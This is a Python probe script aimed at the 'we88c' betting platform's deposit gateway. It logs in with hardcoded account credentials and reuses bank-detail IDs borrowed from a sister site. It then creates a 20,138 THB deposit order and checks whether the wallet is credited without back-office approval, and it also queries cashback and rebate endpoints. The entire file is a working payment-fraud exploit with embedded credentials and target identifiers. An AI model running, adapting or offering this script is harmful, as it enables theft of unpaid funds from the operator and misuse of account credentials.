#!/usr/bin/env python3
"""probe42_we88c_deposit.py — we88c deposit-gateway test.
we88c is known to auto-credit deposits without BO approval (2026-10-09 confirm).
Test: deposit-gateway → order creation → auto-credit check.
"""
import requests, json, time, pathlib, base64, sys

TID = "54ef7626cb381f4bab8be91f0cdbce47"  # we88c
MGAPI = f"https://{TID}mgapi.asdgapicenterssdo.com"
PBAPI = f"https://{TID}pbapi.asdgapicenterssdo.com"
PLAYER_ID = "266d74e3-d6ca-47eb-b9ac-b8c45574bad4"

def get_jwt():
    p = pathlib.Path(".jwt.we88c")
    if p.exists():
        jwt = p.read_text().strip()
        try:
            pl = json.loads(base64.urlsafe_b64decode(jwt.split('.')[1] + '=='))
            if pl.get('exp', 0) - time.time() > 300:
                return jwt
        except:
            pass
    r = requests.post(f"{PBAPI}/pb/authentication",
        json={"strategy": "local", "username": "0972571110", "password": "Pwned2026!"},
        headers={"Content-Type": "application/json"}, timeout=15)
    if not r.ok:
        print(f"[JWT] FAIL {r.status_code}: {r.text[:200]}")
        sys.exit(1)
    jwt = r.json().get("accessToken", "")
    p.write_text(jwt)
    return jwt

JWT = get_jwt()
H = {"Authorization": f"Bearer {JWT}", "template": "vn", "Content-Type": "application/json"}

print(f"[JWT] OK len={len(JWT)}")

# Step 1: get wallet
r = requests.get(f"{MGAPI}/mb/wallet", headers=H, timeout=10)
bal = r.json()['data'][0]['balance'] if r.ok and r.json().get('data') else '?'
print(f"[wallet before] {bal} THB")

# Step 2: get payment-type to find bank_detail_ids
print("\n[payment-type] ...")
r = requests.get(f"{MGAPI}/mb/payment-type?include=true", headers=H, timeout=15)
print(f"  {r.status_code}: {r.text[:500]}")
bank_detail_ids = []
if r.ok:
    items = r.json() if isinstance(r.json(), list) else r.json().get("data", [])
    for it in items:
        bid = it.get("id") or it.get("bank_detail_id")
        ptype = it.get("type_payment_method") or it.get("payment_type_code")
        if bid:
            bank_detail_ids.append((bid, ptype))
            print(f"  id={bid} type={ptype}")

# Fallback: use vak88z2 IDs (same platform, may share pool)
if not bank_detail_ids:
    bank_detail_ids = [
        ("00b6996c-0e41-4b56-9fa7-94f77f4fd717", "KBANK"),
        ("941d8905-155a-40cb-b4b5-fabe4f4e3977", "KTB"),
    ]
    print(f"  [fallback] using vak88z2 IDs")

# Step 3: deposit-gateway
print("\n[deposit-gateway] ...")
for bank_id, btype in bank_detail_ids[:3]:
    body = {
        "id": bank_id,
        "deposit_amount": 20138,
        "deposit_token": None,
        "deposit_account_id": None,
    }
    r = requests.post(f"{MGAPI}/mb/deposit-gateway", json=body, headers=H, timeout=20)
    print(f"  {r.status_code} [{btype}]: {r.text[:300]}")
    if r.ok:
        order_id = r.json().get("data", {}).get("id") or r.json().get("id")
        print(f"  ORDER ID: {order_id}")
        # Check wallet after order creation (auto-credit?)
        time.sleep(3)
        rw = requests.get(f"{MGAPI}/mb/wallet", headers=H, timeout=10)
        bal2 = rw.json()['data'][0]['balance'] if rw.ok and rw.json().get('data') else '?'
        print(f"  [wallet after order] {bal2} THB")
        break

# Step 4: check cashback/rebate
print("\n[cashback-transaction] ...")
r = requests.get(f"{MGAPI}/mb/cashback-transaction?status=available", headers=H, timeout=15)
print(f"  {r.status_code}: {r.text[:300]}")

r = requests.get(f"{MGAPI}/mb/rebate", headers=H, timeout=15)
print(f"[rebate] {r.status_code}: {r.text[:200]}")

print("\n=== DONE ===")
